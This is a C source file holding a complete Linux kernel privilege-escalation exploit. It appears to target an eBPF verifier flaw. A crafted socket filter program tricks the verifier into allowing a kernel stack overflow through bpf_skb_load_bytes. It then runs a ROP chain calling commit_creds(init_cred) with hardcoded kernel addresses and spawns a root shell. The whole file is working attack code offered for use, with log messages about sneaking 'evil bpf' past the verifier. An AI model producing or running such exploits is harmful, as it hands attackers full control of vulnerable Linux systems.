#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>

#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){                        \
        .code = CODE,                          \
        .dst_reg = DST,                        \
        .src_reg = SRC,                        \
        .off = OFF,                            \
        .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \
    ((struct bpf_insn){                    \
        .code = BPF_LD | BPF_DW | BPF_IMM, \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off = 0,                          \
        .imm = (__u32)(IMM)}),             \
        ((struct bpf_insn){                \
            .code = 0,                     \
            .dst_reg = 0,                  \
            .src_reg = 0,                  \
            .off = 0,                      \
            .imm = ((__u64)(IMM)) >> 32})

#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)
#define BPF_ALU_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)
#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)
#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)
#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_LD_ABS(SIZE, IMM) BPF_RAW_INSN(BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, 0, 0, 0, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define LOG_BUF_SIZE 65536

int doredact = 0;
char bpf_log_buf[LOG_BUF_SIZE];
size_t buffer[0x100];
int sockets[2];
int mapfd;

void fail(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[!] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
    exit(1);
}

void redact(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    if (doredact)
    {
        fprintf(stdout, "[!] ( ( R E D A C T E D ) )\n");
        return;
    }
    fprintf(stdout, "[*] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
}

void msg(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[*] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
}

int bpf_create_map(enum bpf_map_type map_type,
                   unsigned int key_size,
                   unsigned int value_size,
                   unsigned int max_entries)
{
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries};

    return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
    };

    return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, const void *key, const void *value,
                    uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
        .flags = flags,
    };

    return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type,
                  const struct bpf_insn *insns, int insn_cnt,
                  const char *license)
{
    union bpf_attr attr = {
        .prog_type = type,
        .insns = ptr_to_u64(insns),
        .insn_cnt = insn_cnt,
        .license = ptr_to_u64(license),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 2,
    };

    return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_obj_get_info_by_fd(int fd, const unsigned int info_len, void *info)
{
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.info.bpf_fd = fd;
    attr.info.info_len = info_len;
    attr.info.info = ptr_to_u64(info);
    return syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

int load_prog()
{

    struct bpf_insn prog[] = {
        // trigger vulnerability
        BPF_MOV64_IMM(BPF_REG_9, 0x40),               // BPF_REG_9=0x40
        BPF_MOV64_IMM(BPF_REG_8, 0x1),                // BPF_REG_8=0x1
        BPF_ALU64_REG(BPF_RSH, BPF_REG_8, BPF_REG_9), // BPF_REG_8 << BPF_REG_9  //BPF_REG_8 verifier:0,fact:1
        // call bpf_skb_load_bytes to stack overflow
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x100),                           // BPF_REG_8 *= 0x100
        BPF_MOV64_IMM(BPF_REG_2, 0),                                        // BPF_REG_2 = 0      		//rsi = 0
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),                               // BPF_REG_3=BPF_REG_10 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),                              // BPF_REG_3 =BPF_REG_3-8  	//rcx = rbp-8
        BPF_MOV64_IMM(BPF_REG_4, 8),                                        // BPF_REG_4=8
        BPF_ALU64_REG(BPF_ADD, BPF_REG_4, BPF_REG_8),                       // BPF_REG_4+=BPF_REG_8   	//rdx = 8+0x100
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes), // call bpf_skb_load_bytes(const void *skb, u32 offset, void *to,u32 len)
        BPF_EXIT_INSN(),
    };
    return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

// write_msg() —— trigger to execute eBPF code
int write_msg()
{
    ssize_t n = write(sockets[0], buffer, sizeof(buffer));
    if (n < 0)
    {
        perror("write");
        return 1;
    }
    if (n != sizeof(buffer))
    {
        fprintf(stderr, "short write: %ld\n", n);
    }
    return 0;
}

void get_root()
{
    if (getuid() != 0)
    {
        fail("didn't got root\n");
    }
    else
    {
        msg("got root\n");
        system("/bin/sh");
    }
    exit(0);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    msg("status has been saved.\n");
}
/*
/ # cat /proc/kallsyms |grep init_cred
ffffffff81b2d5e0 t maybe_init_creds
ffffffff82e6e860 D init_cred

/ # cat /proc/kallsyms |grep commit_cred
ffffffff810d7210 T commit_creds

/ #  cat /proc/kallsyms |grep  swapgs_restore_regs_and_return_to_usermode
ffffffff81e00ff0 T swapgs_restore_regs_and_return_to_usermode
*/
#define commit_creds 0xffffffff810d7210
#define init_cred 0xffffffff82e6e860
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81e00ff0
int main(int argc, char *argv[])
{

    // Step 1: create eBPF code, verify and
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 0x100);
    if (mapfd < 0)
    {
        fail("failed to create map '%s'\n", strerror(errno));
    }
    redact("sneaking evil bpf past the verifier\n");
    int progfd = load_prog(); // verify
    printf("%s\n", bpf_log_buf);
    if (progfd < 0)
    {
        if (errno == EACCES)
        {
            msg("log:\n%s", bpf_log_buf);
        }
        printf("%s\n", bpf_log_buf);
        fail("failed to load prog '%s'\n", strerror(errno));
    }

    redact("creating socketpair()\n");
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
    {
        fail("failed to create socket pair '%s'\n", strerror(errno));
    }

    redact("attaching bpf backdoor to socket\n");
    if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
    {
        fail("setsockopt '%s'\n", strerror(errno));
    }

    if (argc == 2)
    {
        size_t offset = strtoul(argv[1], NULL, 16) - 0xffffffff81000000;
        save_status();
        int i = 0;
        buffer[i++] = 0;
        buffer[i++] = 0;
        buffer[i++] = offset + 0xffffffff81097050; // pop rdi; retn
        buffer[i++] = offset + init_cred;
        buffer[i++] = offset + commit_creds; // commit_creds(init_cred)
        buffer[i++] = offset + swapgs_restore_regs_and_return_to_usermode + 0x1b;
        buffer[i++] = 0;
        buffer[i++] = 0;
        buffer[i++] = (size_t)&get_root; // rip
        buffer[i++] = user_cs;
        buffer[i++] = user_rflags;
        buffer[i++] = user_sp;
        buffer[i++] = user_ss;
    }
    write_msg();
}
